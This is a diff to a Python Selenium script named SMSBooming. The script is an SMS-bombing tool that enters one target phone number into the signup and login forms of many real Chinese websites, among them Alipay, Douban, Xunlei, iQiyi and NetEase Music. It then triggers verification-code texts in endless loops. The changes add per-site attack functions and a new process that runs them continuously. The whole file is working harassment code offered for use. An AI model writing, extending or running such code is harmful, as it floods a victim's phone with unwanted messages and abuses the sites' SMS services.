@@ -1,6 +1,5 @@
 import time
 from random import choice
-from itertools import cycle
 from datetime import datetime
 from multiprocessing import Process
 from selenium import webdriver
@@ -39,8 +38,8 @@ class SMSBooming:
         _password = choice(self.passwords)
         try:
             if name is not None:
-                driver.find_element(name[0], name[1]).send_keys(
-                    choice(self.names))
+                driver.find_element(
+                    name[0], name[1]).send_keys(choice(self.names))
             time.sleep(1)
             driver.find_element(phone[0], phone[1]).send_keys(self.phone[:3])
             time.sleep(1)
@@ -58,7 +57,7 @@ class SMSBooming:
             pass
 
     def timer(self, start_time, platform):
-        sleep = True
+        sleep = False
         while True:
             if datetime.now().hour != start_time or sleep is True:
                 time.sleep(60 * 60)
@@ -79,26 +78,171 @@ class SMSBooming:
         self.timer(12, daily)
 
     def run_constantly(self):
-        driver = self.create_driver()
-        for platform in cycle(constantly):
-            self.boom(driver, platform)
-            time.sleep(10)
+        while True:
+            driver = self.create_driver()
+            for platform in constantly:
+                self.boom(driver, platform)
+                time.sleep(10)
+            driver.close()
+
+    def run_special(self):
+        websites = [
+            self.bdgcw, self.xinlei_register, self.xinlei_login,
+            self.pass_17173, self.music_163, self.jiayuan, self.cnmo, self.fkw,
+            self.pptv, self.a5, self.alipay, self.baixing, self.iqiyi,
+            self.douban, self.liuxue51
+        ]
+        while True:
+            driver = self.create_driver()
+            for website in websites:
+                try:
+                    website(driver)
+                except:
+                    pass
+                time.sleep(10)
+            driver.close()
 
     def run(self):
-        p1 = Process(target=self.run_constantly)
-        p2 = Process(target=self.run_daily)
-        p3 = Process(target=self.run_telephone)
-        p1.start()
-        p2.start()
-        p3.start()
+        # p1 = Process(target=self.run_constantly)
+        # p2 = Process(target=self.run_daily)
+        # p3 = Process(target=self.run_telephone)
+        p4 = Process(target=self.run_special)
+        # p1.start()
+        # p2.start()
+        # p3.start()
+        p4.start()
+    #
+    # def bfsu(self, driver):
+    #     self.request(driver, 'https://liuxue.bfsu.edu.cn/apply/index.php/welcome')
+    #     driver.switch_to.alert().accept()
+    #     driver.find_element_by_name('name').send_keys(choice(self.names))
+    #     driver.find_element_by_name('phone').send_keys(self.phone)
+    #     driver.find_element_by_id('sendEmail').click()
+
+    def bdgcw(self, driver):
+        self.request(driver, 'http://wuhan.bdcgw.cn/pctg/2345/2961/?A')
+        driver.find_element_by_xpath('//input[@id="gp"]').send_keys(choice(['601258', '300370', '601952', '603728']))
+        driver.find_element_by_xpath('//input[@name="tgMobile1"]').send_keys(self.phone)
+        driver.find_element_by_id('btnTg1').click()
+
+    def cnmo(self, driver):
+        self.request(driver, 'http://passport.cnmo.com/register/')
+        driver.find_element_by_xpath('//input[@id="m_mobile"]').send_keys(self.phone)
+        driver.find_element_by_xpath('//input[@id="m_uname"]').send_keys('aoiwfhoqwfnckj')
+        driver.find_element_by_xpath('//input[@id="m_password"]').send_keys('123qwe123')
+        driver.find_element_by_xpath('//input[@id="m_confirm"]').send_keys('123qwe123')
+        driver.find_element_by_xpath('//input[@id="m_getcode"]').click()
+
+    def xinlei_login(self, driver):
+        self.request(driver, 'http://i.xunlei.com/login.html')
+        driver.switch_to.frame('loginIframe')
+        driver.find_element_by_id('ml_tab').click()
+        time.sleep(0.5)
+        driver.find_element_by_xpath('//input[@id="ml_m"]').send_keys(self.phone)
+        driver.find_element_by_id('ml_gc').click()
+
+    def xinlei_register(self, driver):
+        self.request(driver, 'http://i.xunlei.com/login.html')
+        driver.switch_to.frame('loginIframe')
+        driver.find_element_by_id('turnRegister').click()
+        time.sleep(0.5)
+        driver.find_element_by_xpath('//input[@id="pr_m"]').send_keys(self.phone)
+        driver.find_element_by_id('pr_gc').click()
+
+    def fkw(self, driver):
+        self.request(driver, 'http://jz.fkw.com/reg.html')
+        driver.switch_to.frame('regIframe')
+        driver.find_element_by_xpath('//input[@id="regAcct"]').send_keys(self.phone)
+        driver.find_element_by_class_name('item_coed').click()
+
+    def jiayuan(self, driver):
+        self.request(driver, 'http://reg.jiayuan.com/signup/fillbasic.php')
+        driver.find_element_by_id('phoneNumber').send_keys(self.phone)
+        driver.find_element_by_id('mobile_vali').send_keys(self.phone[:4])
+        time.sleep(0.5)
+        driver.find_element_by_xpath('//a[@id="get"]').click()
+
+    def music_163(self, driver):
+        self.request(driver, 'http://music.163.com/#/login')
+        driver.execute_script('top.reg();return false;')
+        time.sleep(0.5)
+        driver.find_element_by_class_name('j-phone').send_keys(self.phone)
+        driver.find_element_by_class_name('j-pwd').send_keys(choice(self.passwords))
+        driver.find_element_by_class_name('j-btn').click()
+
+    def pass_17173(self, driver):
+        self.request(driver, 'https://passport.17173.com/register')
+        driver.find_element_by_link_text('手机注册').click()
+        driver.find_element_by_xpath('//input[contains(@class, "input-passport valid")]').send_keys(self.phone)
+        driver.find_element_by_xpath('//input[contains(@class, "input-pw valid")]').send_keys(choice(self.passwords))
+        driver.find_element_by_class_name('get-captcha').click()
+
+    def pptv(self, driver):
+        self.request(driver, 'http://www.pptv.com/')
+        driver.find_element_by_id('user_register_tj').click()
+        time.sleep(1)
+        driver.switch_to.frame('iframeLogin')
+        phone = driver.find_element_by_xpath('//form[@id="isPCSite"]/ul/li/input')
+        phone.send_keys(self.phone[:5])
+        time.sleep(1)
+        phone.send_keys(self.phone[5:])
+        driver.find_element_by_class_name('get-verify-code').click()
+
+    # def iqiyi(self, driver):
+    #     self.request(driver, 'http://vip.iqiyi.com/')
+    #     driver.find_element_by_class_name('j_vip_reg').click()
+    #     time.sleep(1)
+    #     driver.switch_to.frame('login_frame')
+    #     driver.find_element_by_class_name('txt-account').send_keys(self.phone)
+    #     driver.find_element_by_link_text('注册').click()
+
+    def baixing(self, driver):
+        self.request(driver, 'http://www.baixing.com/oz/verify/reg')
+        driver.find_element_by_link_text('手机号码注册').click()
+        time.sleep(1)
+        driver.find_element_by_xpath('//div[@class="publish-detail-item"]/input').send_keys(self.phone)
+        driver.find_element_by_xpath('//p[@class="p-submit"]/button').click()
+
+    def a5(self, driver):
+        self.request(driver, 'https://www.a5.net/member.php?mod=register')
+        driver.execute_script("$('agreebbrule').checked = true;hideMenu('fwin_dialog', 'dialog');")
+        time.sleep(1)
+        driver.find_element_by_id('mobile').send_keys(self.phone)
+        driver.execute_script("showWindow('mcode', 'plugin.php?id=bischina_captcha:msmscode&mobile='+$('mobile').value,'get',0);")
+
+    def douban(self, driver):
+        self.request(driver, 'https://accounts.douban.com/register')
+        driver.find_element_by_xpath('//div[@class="agreement-btns"]/a').click()
+        time.sleep(1)
+        driver.find_element_by_id('verify_phone_num').send_keys(self.phone)
+        driver.find_element_by_id('request-phone-code-btn').click()
+
+    def liuxue51(self, driver):
+        self.request(driver, 'http://www.liuxue51.net/user/register')
+        driver.find_element_by_id('UbLoginName').send_keys(self.phone)
+        driver.find_element_by_id('UbPassword').send_keys('123qwe123')
+        driver.find_element_by_id('UbPasswordRepeat').send_keys('123qwe123')
+        driver.find_element_by_id('UbType1').click()
+        driver.execute_script('sendMessage()')
+
+    def alipay(self, driver):
+        self.request(driver, 'https://memberprod.alipay.com/account/reg/index.htm')
+        iframe = 'dialog-iframe' + str(int(time.time() * 1000))
+        driver.switch_to.frame(iframe)
+        driver.find_element_by_class_name('J-agree-button').click()
+        time.sleep(1)
+        driver.find_element_by_id('J-accName').send_keys(self.phone)
+        driver.find_element_by_id('J-mobCode').send_keys('1')
+        driver.find_element_by_link_text('获取验证码').click()
+
+    def iqiyi(self, driver):
+        self.request(driver, 'http://www.iqiyi.com/iframe/loginreg?is_reg=1')
+        driver.find_element_by_class_name('txt-account').click()
+        driver.find_element_by_class_name('txt-account').send_keys(self.phone)
+        driver.find_element_by_link_text('注册').click()
 
 
 constantly = [
-    {
-        'url': 'https://www.zhihu.com/signup',
-        'phone': (By.NAME, 'phoneNo'),
-        'register': (By.CLASS_NAME, 'SignFlow-smsInputButton')
-    },
     {
         'url': 'https://om.qq.com/userReg/register?mediaType=1',
         'phone': (By.ID, 'phone'),
@@ -111,20 +255,9 @@ constantly = [
         'register': (By.ID, 'signupPhone')
     },
     {
-        'url': 'http://www.zhangmen.com/lp/sem',
-        'name': (By.ID, 's-name'),
-        'phone': (By.ID, 'stu_mobile1'),
-        'register': (By.ID, 'pcheaderbtn2')
-    },
-    {
         'url': 'http://passport.soufun.com/register.aspx',
         'phone': (By.ID, 'strMobile'),
         'register': (By.XPATH, '//input[@id="vcode"]')
-    },
-    {
-        'url': 'http://wuhan.bdcgw.cn/pctg/2345/2961/?A',
-        'phone': (By.XPATH, '//input[@name="tgMobile1"]'),
-        'register': (By.ID, 'btnTg1')
     },
     {
         'url': 'http://www.wanke001.com/Register/Register.aspx',
@@ -132,31 +265,23 @@ constantly = [
         'register': (By.ID, 'sendCode')
     },
     {
-        'url': 'http://passport.cnmo.com/register/',
-        'phone': (By.XPATH, '//input[@id="m_mobile"]'),
-        'name': (By.XPATH, '//input[@id="m_uname"]'),
-        'password': (By.XPATH, '//input[@id="m_password"]'),
-        'password_confirm': (By.XPATH, '//input[@id="m_confirm"]'),
-        'register': (By.XPATH, '//input[@id="m_getcode"]')
-    },
-    {
         'url': 'https://my.22.cn/register.html',
         'phone': (By.XPATH, '//input[@id="iphoneCode"]'),
         'register': (By.XPATH, '//input[@id="iphone-code-get"]'),
     },
     {
-        'url': 'http://www.888v666.com/zzsq/',
-        'phone': (By.XPATH, '//input[@id="mobile"]'),
-        'register': (By.XPATH, '//span[@class="item_code"]')
+        'url': 'https://account.youku.com/register.htm',
+        'phone': (By.ID, 'passport'),
+        'password': (By.ID, 'password'),
+        'password_confirm': (By.ID, 'repeatPsd'),
+        'register': (By.ID, 'getMobileCode')
     },
     {
-        'url': 'http://u.tiandaoedu.com/register.html',
-        'phone': (By.ID, 'u_phone'),
-        'password': (By.ID, 'p_verify'),
-        'register': (By.CLASS_NAME, 'w_inp_yzm')
-    }
+        'url': 'https://www.zhihu.com/signup',
+        'phone': (By.NAME, 'phoneNo'),
+        'register': (By.CLASS_NAME, 'SignFlow-smsInputButton')
+    },
 ]
-
 
 telephone = [
     {
@@ -229,6 +354,18 @@ telephone = [
 
 daily = [
     {
+        'url': 'http://www.zhangmen.com/lp/sem',
+        'name': (By.ID, 's-name'),
+        'phone': (By.ID, 'stu_mobile1'),
+        'register': (By.ID, 'pcheaderbtn2')
+    },
+    {
+        'url': 'https://passport.yhd.com/passport/register_input.do',
+        'phone': (By.XPATH, '//input[@class="phone"]'),
+        'password': (By.XPATH, '//input[@class="validPhoneCode"]'),
+        'register': (By.CLASS_NAME, 'r_require_code')
+    },
+    {
         'url': 'http://longmenedu.com.cn/baoming.asp',
         'name': (By.NAME, 'UserName'),
         'phone': (By.NAME, 'Mtel'),
@@ -284,89 +421,19 @@ daily = [
 ]
 
 special = [
-    # alert
-    {
-        'url': 'https://liuxue.bfsu.edu.cn/apply/index.php/welcome',
-        'name': (By.NAME, 'name'),
-        'phone': (By.NAME, 'tel'),
-        'register': (By.ID, 'sendEmail')
-    },
-    # frame
-    {
-        'url': 'http://i.xunlei.com/login.html',
-        'frame': 'loginIframe',
-        'click': (By.ID, 'ml_tab'),
-        'phone': (By.XPATH, '//input[@id="ml_m"]'),
-        'register': (By.ID, 'ml_gc')
-    },
-    {
-        'url': 'http://i.xunlei.com/login.html',
-        'frame': 'loginIframe',
-        'click': (By.ID, 'turnRegister'),
-        'phone': (By.XPATH, '//input[@id="pr_m"]'),
-        'register': (By.ID, 'pr_gc')
-    },
-    {
-        'url': 'http://jz.fkw.com/reg.html',
-        'frame': 'regIframe',
-        'phone': (By.XPATH, '//input[@id="regAcct"]'),
-        'register': (By.CLASS_NAME, 'item_code')
-    },
-    # name after phone
-    {
-        'url': 'http://reg.jiayuan.com/signup/fillbasic.php',
-        'phone': (By.ID, 'phoneNumber'),
-        'name': (By.ID, 'mobile_vali'),
-        'sleep': True,
-        'register': (By.XPATH, '//a[@id="get"]')
-    },
-    # script
-    {
-        'url': 'http://music.163.com/#/login',
-        'script': 'top.reg();return false;',
-        'sleep': True,
-        'phone': (By.CLASS_NAME, 'j-phone'),
-        'password': (By.CLASS_NAME, 'j-pwd'),
-        'register': (By.CLASS_NAME, 'j-btn')
-    },
-    # password confirm
-    {
-        'url': 'https://account.youku.com/register.htm',
-        'phone': (By.ID, 'passport'),
-        'password': (By.ID, 'password'),
-        'password_confirm': (By.ID, 'repeatPsd'),
-        'register': (By.ID, 'getMobileCode')
-    },
-    # click
-    {
-        'url': 'https://passport.17173.com/register',
-        'click': (By.LINK_TEXT, '手机注册'),
-        'phone': (By.XPATH, '//input[contains(@class, "input-passport valid")]'),
-        'password': (By.XPATH, '//input[contains(@class, "input-pw valid")]'),
-        'register': (By.CLASS_NAME, 'get-captcha')
-    },
-    # double click
-    {
-        'url': 'https://passport.yhd.com/passport/register_input.do',
-        'phone': (By.XPATH, '//input[@class="phone"]'),
-        'password': (By.XPATH, '//input[@class="validPhoneCode"]'),
-        'register': (By.CLASS_NAME, 'r_require_code')
-    },
     # 获取不到
     {
         'url': 'http://www.lofter.com/phoneAccount/register',
         'phone': (By.XPATH, '//input[@id="phone-num"]'),
         'register': (By.LINK_TEXT, '获取验证码')
     },
+    # 请求不到
+    {
+        'url': 'http://www.888v666.com/zzsq/',
+        'phone': (By.XPATH, '//input[@id="mobile"]'),
+        'register': (By.XPATH, '//span[@class="item_code"]')
+    },
 
-    # TODO: http://www.pptv.com/
-    # TODO: http://vip.iqiyi.com/
-    # TODO: http://www.eqxiu.com/
-    # TODO: http://www.baixing.com/oz/verify/reg
-    # TODO: https://www.a5.net/member.php?mod=register
-    # TODO: https://accounts.douban.com/register
-    # TODO: http://zt.epwk.com/1607epzhelu/
-    # TODO: http://www.liuxue51.net/user/register
     # TODO: https://memberprod.alipay.com/account/reg/index.htm
 ]
 
